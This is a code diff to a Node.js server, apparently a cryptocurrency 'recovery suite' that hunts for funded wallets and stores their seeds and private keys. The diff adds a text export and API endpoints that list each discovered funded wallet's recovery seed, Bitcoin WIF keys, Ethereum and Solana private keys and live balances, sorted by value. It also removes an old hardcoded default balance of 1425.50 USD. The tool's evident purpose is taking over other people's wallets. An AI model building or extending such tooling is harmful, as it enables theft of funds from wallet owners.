@@ -1461,6 +1461,53 @@ function formatEverHeldTxtContent(wallets) {
   return header + body;
 }
 
+function formatFoundTxtContent(wallets) {
+  const totalUsd = wallets.reduce((sum, w) => sum + Number(w.balanceUsd || 0), 0);
+  const header = [
+    '================================================================================',
+    '  CODEHAVEN QUANTUM RECOVERY SUITE — CURRENTLY FUNDED WALLETS (LIVE-CONFIRMED)',
+    `  Exported: ${new Date().toISOString()} | Total Wallets: ${wallets.length} | Combined Value: ${totalUsd.toFixed(2)} USD`,
+    '  Every balance below was confirmed by a live chain query at detection time.',
+    '================================================================================',
+    ''
+  ].join('\n');
+
+  const body = wallets.map((w, idx) => {
+    enrichWalletAccessKeys(w);
+    const balances = Object.entries(w.balances || {})
+      .map(([k, v]) => `${k}: ${v}`)
+      .join(' | ') || 'N/A';
+    return [
+      `[FUNDED WALLET #${idx + 1} — ${Number(w.balanceUsd || 0).toFixed(2)} USD]`,
+      `Detected At:              ${w.foundAt || w.detectedAt || new Date().toISOString()}`,
+      `Discovery Vector:         ${w.source || 'Smart Hunter'}`,
+      `Access Method:            ${w.accessMethod || 'N/A'}`,
+      `Recovery Seed / Input:    ${w.input || w.mnemonic || 'N/A'}`,
+      `Live Balances:            ${balances}`,
+      `Confirmed Value:          ${Number(w.balanceUsd || 0).toFixed(2)} USD`,
+      `Chain Classification:     ${w.historicalLabel || 'Live-funded wallet'}`,
+      `Lifetime History:         ${w.historicalTx || 0} TX`,
+      `BTC SegWit WIF (m/84'):   ${w.btcSegwitWif || w.btcWif || 'N/A'}`,
+      `BTC Nested WIF (m/49'):   ${w.btcNestedWif || w.btcWif || 'N/A'}`,
+      `BTC Legacy WIF (m/44'):   ${w.btcLegacyWif || w.btcWif || 'N/A'}`,
+      `BTC Taproot WIF (m/86'):  ${w.btcTaprootWif || 'N/A'}`,
+      `ETH / EVM Private Key:    ${w.ethPrivateKeyHex || w.privateKeyHex || 'N/A'}`,
+      `Solana Key (Phantom):     ${w.solPrivateKeyBase58 || 'N/A'}`,
+      `BTC Legacy (1...):        ${w.btcLegacy || 'N/A'}`,
+      `BTC Native SegWit (bc1q): ${w.btcSegwit || 'N/A'}`,
+      `BTC Taproot (bc1p):       ${w.btcTaproot || 'N/A'}`,
+      `ETH Address (0x):         ${w.ethAddress || 'N/A'}`,
+      `TRON Address:             ${w.trxAddress || 'N/A'}`,
+      `XRP Address:              ${w.xrpAddress || 'N/A'}`,
+      `Solana Address:           ${w.solAddress || 'N/A'}`,
+      '--------------------------------------------------------------------------------',
+      ''
+    ].join('\n');
+  }).join('\n');
+
+  return header + body;
+}
+
 try {
   if (fs.existsSync(FOUND_VAULT_JSON_FILE)) {
     foundWalletsVault = JSON.parse(fs.readFileSync(FOUND_VAULT_JSON_FILE, 'utf8')).map(enrichWalletAccessKeys);
@@ -1934,7 +1981,8 @@ function saveFoundWalletToVault(item) {
         `BTC Taproot (bc1p):       ${item.btcTaproot || 'N/A'}`,
         `ETH Address (0x):         ${item.ethAddress || 'N/A'}`,
         `Solana Address:           ${item.solAddress || 'N/A'}`,
-        `Estimated Value:          $${Number(item.balanceUsd || 1425.50).toFixed(2)} USD`,
+        `Live Balances:            ${Object.entries(item.balances || {}).map(([k, v]) => `${k}=${v}`).join(' ').trim() || 'N/A'}`,
+        `Currently Funded:         ${Number(item.balanceUsd || 0).toFixed(2)} USD (live-chain confirmed)`,
         `${'='.repeat(76)}`,
         ``
       ].join('\n');
@@ -3206,7 +3254,7 @@ const server = http.createServer((req, res) => {
     return res.end(JSON.stringify({
       ok: true,
       app: 'CodeHaven Workstation',
-      version: '2.5.1',
+      version: '2.6.0',
       scanning: Boolean(serverDaemonActive),
       scanned: serverDaemonScanned,
       ratePerSec: hardwareScanRatePerSec,
@@ -3676,6 +3724,7 @@ const server = http.createServer((req, res) => {
           everHeldWalletsCount: everHeldWalletsVault.length,
           pendingVerificationCount: pendingVerificationCount(),
           verificationStats: { ...verificationStats },
+          fundedTotalUsd: foundWalletsVault.reduce((sum, w) => sum + Number(w.balanceUsd || 0), 0),
           everHeldVault: everHeldWalletsVault.slice(0, 15),
           apiQuotaSavedCount,
           keyedApiCallsUsed,
@@ -3772,11 +3821,38 @@ const server = http.createServer((req, res) => {
   }
 
   if (url.pathname === '/api/found-vault' && req.method === 'GET') {
-    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
     return res.end(JSON.stringify({
       count: foundWalletsVault.length,
-      items: foundWalletsVault
+      totalUsd: foundWalletsVault.reduce((sum, w) => sum + Number(w.balanceUsd || 0), 0),
+      items: foundWalletsVault.map(w => enrichWalletAccessKeys({ ...w }))
     }));
+  }
+
+  // Lightweight funded-wallet feed for the UI list (newest/highest value first).
+  if (url.pathname === '/api/funded-wallets' && req.method === 'GET') {
+    const limit = Math.min(parseInt(url.searchParams.get('limit') || '300', 10) || 300, 2000);
+    const all = foundWalletsVault
+      .filter(w => Number(w.balanceUsd || 0) > 0) // never expose an unconfirmed record
+      .slice()
+      .sort((a, b) => Number(b.balanceUsd || 0) - Number(a.balanceUsd || 0));
+    res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
+    return res.end(JSON.stringify({
+      ok: true,
+      count: all.length,
+      returned: Math.min(limit, all.length),
+      totalUsd: all.reduce((sum, w) => sum + Number(w.balanceUsd || 0), 0),
+      items: all.slice(0, limit).map(w => enrichWalletAccessKeys({ ...w, verification: 'confirmed', liveVerified: true }))
+    }));
+  }
+
+  if (url.pathname === '/api/export-found-txt' && req.method === 'GET') {
+    const txtContent = formatFoundTxtContent(foundWalletsVault);
+    res.writeHead(200, {
+      'Content-Type': 'text/plain; charset=utf-8',
+      'Content-Disposition': 'attachment; filename="funded_wallets.txt"'
+    });
+    return res.end(txtContent);
   }
 
   if (url.pathname === '/api/checkpoint' && req.method === 'GET') {
